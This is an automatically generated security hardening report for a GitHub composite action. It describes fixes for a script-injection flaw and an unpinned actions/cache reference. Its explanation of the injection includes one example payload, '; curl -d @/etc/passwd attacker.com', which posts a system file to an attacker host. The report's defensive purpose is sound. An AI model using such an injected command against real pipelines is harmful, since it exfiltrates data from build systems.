<!-- markdownlint-disable -->

# Hardening Report: pre-commit--action/v3.0.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **pre-commit--action/v3.0.1** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` step directly interpolates `${{ inputs.extra_args }}` into the shell command string: `pre-commit run --show-diff-on-failure --color=always ${{ inputs.extra_args }}`. The GitHub Actions template engine substitutes the expression before the shell parses the command, allowing an attacker who controls the `extra_args` input to inject arbitrary shell commands (e.g., `; curl -d @/etc/passwd attacker.com`). Fix: pass the value via an `env:` variable and double-quote it in the script, e.g.:
```yaml
env:
  EXTRA_ARGS: ${{ inputs.extra_args }}
run: pre-commit run --show-diff-on-failure --color=always "$EXTRA_ARGS"
```

Locations:

- `action.yml:16`

### unpinned-uses (severity: high)

The composite action step uses `actions/cache@v4`, which is a mutable tag reference. If the tag is moved (e.g., by a supply-chain compromise of the `actions/cache` repository), the action will silently execute different code. Pin to a full 40-character commit SHA instead, e.g.: `actions/cache@5a3ec84eff668545956fd18022155c47e93e2684 # v4`.

Locations:

- `action.yml:13`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.extra_args }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:20`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

1. Pinned `actions/cache@v4` to full SHA `0057852bfaa89a56745cba8c7296529d2fc39830` with `# v4` comment for readability.
2. Moved `${{ inputs.extra_args }}` out of the `run:` shell string into an `env:` block as `EXTRA_ARGS`. Because `extra_args` is an argument-list input (defaults to `--all-files`), used the xargs-based array tokenization pattern (`printf '%s' "$EXTRA_ARGS" | xargs printf '%s\0'` with a null-delimited read loop) to correctly split the value into separate arguments while preserving quoted sub-arguments and preventing shell injection.

